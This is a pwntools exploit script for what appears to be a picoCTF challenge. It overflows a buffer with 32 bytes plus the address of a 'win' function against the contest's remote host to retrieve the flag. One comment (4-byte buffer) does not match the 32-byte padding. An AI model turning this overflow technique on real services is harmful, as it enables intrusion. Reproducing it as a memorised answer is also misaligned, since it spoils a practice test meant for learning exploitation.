from pwn import *

# Load the binary
binary = ELF('./chall')

# Find the address of the 'win' function
win_address = binary.symbols['win']

# Print the address
log.info(f"Address of win(): {hex(win_address)}")

# Remote connection details
host = 'mimas.picoctf.net'
port = 63136

# Establish connection to the remote service
p = remote(host, port)

# Construct the exploit payload
# Assume input_data is 4 bytes, followed by x, so we need to overflow past 'input_data' (4 bytes)
payload = b"A" * 32               # Overflow input_data
payload += p32(win_address)       # Overwrite x with the address of win(), little-endian format
payload += b'\n'

# Send the payload to trigger the exploit
p.sendlineafter("choice: ", '2')  # Select the option to write to the buffer
p.sendline(payload)               # Send the malicious payload

# Trigger the function call by selecting the option that calls check_win
p.sendlineafter("choice: ", '4')  # Select the option to trigger win()

# Get the flag
p.interactive()  # Interact with the program (this should print the flag)
